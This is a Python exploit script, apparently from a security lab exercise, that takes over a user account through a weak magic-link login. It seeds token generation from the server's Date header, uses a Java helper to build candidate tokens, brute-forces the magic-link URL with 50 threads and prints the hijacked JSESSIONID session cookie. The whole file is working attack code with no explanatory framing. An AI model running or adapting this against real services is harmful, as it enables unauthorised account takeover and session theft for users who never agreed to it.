import concurrent.futures
from datetime import datetime
import os
import pytz
import requests
import threading

genTokenUrl = "http://answers:8888/generateMagicLink"
magicUrl = "http://answers:8888/magicLink/TOKEN"

userName = "Carl"
userId = "5"

tokenFile = "tokens.txt" # hard coded in java

proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

MAX_WORKERS = 50

session = requests.Session()


#=========== 1. generate token and get date============

data = {"username": f"{userName}"}

# response = requests.post(url, data=data)
# headers = {"Content-Type":"application/x-www-form-urlencoded"}
response = requests.post(url=genTokenUrl,data=data,proxies=proxies)

date_header = response.headers.get('date')
print("Date from Response header = ", date_header)

# Parse the date string into a datetime object
date_object = datetime.strptime(date_header, "%a, %d %b %Y %H:%M:%S %Z")

utc_timezone = pytz.timezone('UTC')
date_object_utc = utc_timezone.localize(date_object)

# Convert the datetime object to epoch time (seconds since January 1, 1970)
epoch_time = int(date_object_utc.timestamp() * 1000)

print("Epoch Time from Response          :", epoch_time)



#========== 2. create token using Java ==============
print("[+] Compiling java and generating list of tokens...")
# compile java
os.system("javac TokenUtil.java")
os.system(f"java TokenUtil {userId} {epoch_time}")
# subprocess.check_output("java encryptToken {} {}".format(userId,timeSeed), shell=True)



#================= 3. Bruteforce login ======================

print("[+] Bruteforcing login with tokens")
# Lock to prevent further processing once a successful login is detected
success_lock = threading.Lock()

# Flag to indicate if a successful login is found
login_found = False

with open(tokenFile, "r") as file:
    tokenList = file.readlines()

tokenList = [s.strip() for s in tokenList]


def send_token(s_token):
    global login_found
    
    if login_found:
        return None
    
    matched_token = None  # Initialize outside the lock
    
    response = session.get(url=magicUrl.replace("TOKEN", s_token), allow_redirects=True, proxies=proxies)
    
    if f"Welcome {userName}" in response.text:
        with success_lock:
            matched_token = s_token       
            login_found = True
        return matched_token, login_found
    return None

# Use multithreading to check tokens concurrently
with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    results = [executor.submit(send_token, m_token) for m_token in tokenList]


# Check the responses and print the successful token
for future in concurrent.futures.as_completed(results):
    result = future.result()
    if result:
        matched_token, login_found = result
        # print(f"[+] Found Token! Session cookies: {session.cookies}")
        break

# print(f"cookies: {session.cookies}")
print(f"[+] Login success for '{userName}'")
print(f"[+] Use the following session cookies... JSESSIONID={session.cookies['JSESSIONID']}")
    


# ============ 4. Next =============================

# Close the session
session.close()
